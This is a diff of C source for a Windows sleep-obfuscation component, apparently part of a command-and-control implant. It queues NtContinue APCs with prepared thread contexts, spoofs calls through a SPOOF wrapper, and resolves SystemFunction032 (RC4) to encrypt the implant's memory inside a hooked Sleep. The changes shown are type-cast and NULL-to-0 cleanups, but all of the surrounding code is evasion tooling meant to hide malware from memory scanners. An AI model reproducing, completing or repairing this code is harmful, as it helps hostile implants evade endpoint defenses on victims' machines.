@@ -131,7 +131,7 @@ SECTION( D ) NTSTATUS queueAPCs( PAPI pApi, PCONTEXT* contexts, HANDLE hThread )
     NTSTATUS Status;
     for( int i = 9; i >= 0; i-- )
     {
-        Status = pApi->ntdll.NtQueueApcThread( hThread, pApi->ntdll.NtContinue, contexts[i], NULL, NULL );
+        Status = pApi->ntdll.NtQueueApcThread( hThread, C_PTR( pApi->ntdll.NtContinue ), contexts[i], NULL, NULL );
         if( Status != STATUS_SUCCESS )
         {
             break;
@@ -147,7 +147,7 @@ SECTION( D ) VOID initContexts( PAPI pApi, PCONTEXT* contexts )
 
     for( int i = 13; i >= 0; i-- )
     {
-        contexts[i] = ( PCONTEXT )SPOOF( pApi->ntdll.RtlAllocateHeap, pApi->hNtdll, pApi->szNtdll, hProcessHeap, HEAP_ZERO_MEMORY, sizeof( CONTEXT ) );
+        contexts[i] = ( PCONTEXT )C_PTR( SPOOF( pApi->ntdll.RtlAllocateHeap, pApi->hNtdll, pApi->szNtdll, hProcessHeap, C_PTR( HEAP_ZERO_MEMORY ), C_PTR( sizeof( CONTEXT ) ) ) );
         if( i < 10 )
         {
             *contexts[i] = *contexts[11];
@@ -233,7 +233,7 @@ SECTION( D ) VOID delayExec( PAPI pApi )
 {
     #define CHECKERR( status )  if( status != STATUS_SUCCESS ) { goto cleanup; };
 
-    NTSTATUS    Status  = NULL;
+    NTSTATUS    Status  = 0;
     HANDLE      SyncEvt = NULL;
     HANDLE      WaitThd = NULL;
     HANDLE      OrigThd = NULL;
@@ -447,7 +447,7 @@ SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
     };
     
     pApi->ntdll.RtlInitAnsiString( &Str, C_PTR( OFFSET( "SystemFunction032" ) ) );
-    pApi->ntdll.LdrGetProcedureAddress( pApi->hAdvapi, &Str, 0, &pApi->advapi.SystemFunction032 );
+    pApi->ntdll.LdrGetProcedureAddress( pApi->hAdvapi, &Str, 0, ( PVOID* )&pApi->advapi.SystemFunction032 );
     
     RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
     RtlSecureZeroMemory( &Str, sizeof( Str ) );
@@ -470,7 +470,7 @@ SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds )
     API Api;
     RtlSecureZeroMemory( &Api, sizeof( Api ) );
 
-    Api.CFG            = NULL;
+    Api.CFG            = 0;
     Api.dwMilliseconds = dwMilliseconds;
     Api.Buffer         = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Region );
     Api.Length         = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Size );
